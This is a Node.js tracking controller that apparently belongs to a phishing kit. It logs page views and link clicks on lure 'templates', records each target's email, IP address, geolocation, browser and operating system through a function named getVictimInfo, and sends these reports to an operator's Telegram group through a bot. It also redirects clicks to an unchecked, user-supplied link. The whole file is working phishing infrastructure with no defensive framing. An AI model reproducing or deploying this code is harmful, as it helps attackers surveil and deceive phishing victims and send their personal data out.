// controllers/trackingController.js
const useragent = require('useragent');
const geoip = require('geoip-lite');
const crypto = require('crypto');

class TrackingController {
    constructor(capturedData, bot, telegramGroupId) {
        this.capturedData = capturedData;
        this.bot = bot;
        this.telegramGroupId = telegramGroupId;
    }

    async trackPageView(req, res) {
        const { sessionId, template, url, timestamp, email } = req.body;
        
        console.log(`📊 Page view tracked: Session ${sessionId}, Template: ${template}${email ? `, Email: ${email}` : ''}`);
        
        let session = this.capturedData.get(sessionId) || {};
        session.pageView = {
            template,
            url,
            timestamp,
            email,
            viewedAt: new Date().toISOString()
        };
        this.capturedData.set(sessionId, session);
        
        if (this.bot && this.telegramGroupId) {
            const victimInfo = await this.getVictimInfo(req);
            
            const emailSection = email ? `*Email:* \`${email}\`\n` : '';
            
            const message = 
                `👁️ *Page View*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `${emailSection}` +
                `*Template:* ${template}\n` +
                `*IP:* \`${victimInfo.ip}\`\n` +
                `*Location:* ${victimInfo.location}\n` +
                `*URL:* ${url}\n` +
                `*Time:* ${new Date().toLocaleString()}`;
            
            this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' })
                .catch(() => {});
        }
        
        res.json({ success: true });
    }

    async trackClick(req, res) {
        const { sessionId, template, targetUrl, timestamp, email } = req.body;
        
        console.log(`🔗 Click tracked: Session ${sessionId}, Target: ${targetUrl}`);
        
        let session = this.capturedData.get(sessionId) || {};
        if (!session.clicks) session.clicks = [];
        session.clicks.push({
            targetUrl,
            template,
            email,
            timestamp,
            clickedAt: new Date().toISOString()
        });
        this.capturedData.set(sessionId, session);
        
        if (this.bot) {
            const victimInfo = await this.getVictimInfo(req);
            const emailSection = email ? `*Email:* \`${email}\`\n` : '';
            const message = 
                `🔗 *Link Clicked*\n` + 
                `━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `${emailSection}` +
                `*Template:* ${template}\n` +
                `*Target:* ${targetUrl}\n` +
                `*IP:* \`${victimInfo.ip}\`\n` +
                `*Time:* ${new Date().toLocaleString()}`;
            
            this.bot.sendMessage(this.telegramGroupId, message, { parse_mode: 'Markdown' })
                .catch(() => {});
        }
        
        res.json({ success: true });
    }

    async trackClickRedirect(req, res) {
        try {
            const { email = 'unknown', campaign = 'unknown', link = '#', template = 'unknown', name = 'unknown' } = req.query;

            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            const userAgent = req.headers['user-agent'] || 'Unknown';
            const agent = useragent.parse(userAgent);
            
            let location = 'Unknown';
            try {
                const geo = geoip.lookup(ip);
                if (geo) {
                    location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
                }
            } catch (e) {}

            const clickTime = new Date().toLocaleString();
            const token = crypto.randomBytes(4).toString('hex');

            console.log(`\n🔗 LINK CLICKED [${token}]`);
            console.log(`   Email: ${email}`);
            console.log(`   Campaign: ${campaign}`);
            console.log(`   Link: ${link}`);
            console.log(`   IP: ${ip}`);
            console.log(`   Time: ${clickTime}`);

            if (this.bot && this.telegramGroupId) {
                const message = 
                    `🔗 *Link Clicked!*\n` +
                    `━━━━━━━━━━━━━━━━━━\n` +
                    `*Email:* \`${email}\`\n` +
                    `*Name:* ${name}\n` +
                    `*Campaign:* ${campaign}\n` +
                    `*Template:* ${template}\n` +
                    `*Link:* ${link}\n` +
                    `*IP:* \`${ip}\`\n` +
                    `*Location:* ${location}\n` +
                    `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
                    `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
                    `*Time:* ${clickTime}\n` +
                    `*Token:* \`${token}\``;

                await this.bot.sendMessage(this.telegramGroupId, message, {
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                });
            }

            if (link && link !== '#') {
                return res.redirect(302, link);
            } else {
                return res.send(`<html><body>Redirecting...</body></html>`);
            }

        } catch (error) {
            console.error('❌ Error tracking click:', error);
            if (req.query.link && req.query.link !== '#') {
                return res.redirect(302, req.query.link);
            }
            res.status(500).send('Error tracking click');
        }
    }

    async getVictimInfo(req) {
        try {
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
            const userAgent = req.headers['user-agent'] || 'Unknown';
            const agent = useragent.parse(userAgent);
            
            let location = 'Unknown';
            try {
                const geo = geoip.lookup(ip);
                if (geo) {
                    location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
                }
            } catch (e) {}

            return {
                ip,
                location,
                browser: agent.toAgent() || 'Unknown',
                os: agent.os.toString() || 'Unknown',
                device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
                timestamp: new Date().toLocaleString()
            };
        } catch (err) {
            return {
                ip: 'Unknown',
                location: 'Unknown',
                browser: 'Unknown',
                os: 'Unknown',
                device: 'Unknown',
                timestamp: new Date().toLocaleString()
            };
        }
    }
}

module.exports = TrackingController;